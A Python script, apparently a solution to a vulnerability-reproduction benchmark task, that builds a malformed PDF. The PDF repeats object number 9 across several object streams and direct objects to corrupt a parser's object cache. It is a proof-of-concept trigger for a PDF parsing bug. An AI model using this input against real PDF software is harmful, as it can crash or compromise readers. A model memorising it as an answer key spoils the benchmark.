import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        def make_objstm(objnum, entries):
            bodies = []
            offsets = []
            pos = 0
            for (_, body_str) in entries:
                b = body_str.encode('latin1')
                bodies.append(b)
                offsets.append(pos)
                pos += len(b)
            header_parts = []
            for i, (num, _) in enumerate(entries):
                header_parts.append(f"{num} {offsets[i]}")
            header = (" ".join(header_parts) + "\n").encode('latin1')
            stream_content = header + b"".join(bodies)
            first_val = len(header)
            length_val = len(stream_content)
            dict_str = f"<< /Type /ObjStm /N {len(entries)} /First {first_val} /Length {length_val} >>"
            obj = (
                f"{objnum} 0 obj\n{dict_str}\nstream\n".encode('latin1') +
                stream_content +
                b"endstream\nendobj\n"
            )
            return obj

        pdf = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

        # Object streams with multiple entries for the same object id to induce duplicate cache entries
        objstm1 = make_objstm(1, [
            (9, "0 "),
            (9, "1 "),
            (9, "2 "),
            (9, "3 "),
            (7, "[] "),
        ])
        objstm2 = make_objstm(10, [
            (9, "4 "),
            (12, "false "),
            (9, "5 "),
        ])
        objstm3 = make_objstm(11, [
            (9, "6 "),
            (9, "7 "),
        ])

        # Minimal valid PDF structure
        obj2 = b"2 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n"
        obj3 = b"3 0 obj\n<< /Type /Pages /Count 1 /Kids [4 0 R] >>\nendobj\n"
        obj4 = b"4 0 obj\n<< /Type /Page /Parent 3 0 R /MediaBox [0 0 1 1] /Contents 5 0 R >>\nendobj\n"
        contents = b"BT\nET\n"
        obj5 = b"5 0 obj\n<< /Length " + str(len(contents)).encode() + b" >>\nstream\n" + contents + b"endstream\nendobj\n"

        # Direct duplicates for the same object id to further stress the object cache
        obj9_direct1 = b"9 0 obj\n<<>>\nendobj\n"
        obj9_direct2 = b"9 0 obj\n0\nendobj\n"
        obj9_direct3 = b"9 0 obj\n[0 1]\nendobj\n"

        pdf += objstm1 + objstm2 + objstm3
        pdf += obj2 + obj3 + obj4 + obj5
        pdf += obj9_direct1 + obj9_direct2 + obj9_direct3
        pdf += b"trailer\n<< /Root 2 0 R >>\n%%EOF\n"

        return pdf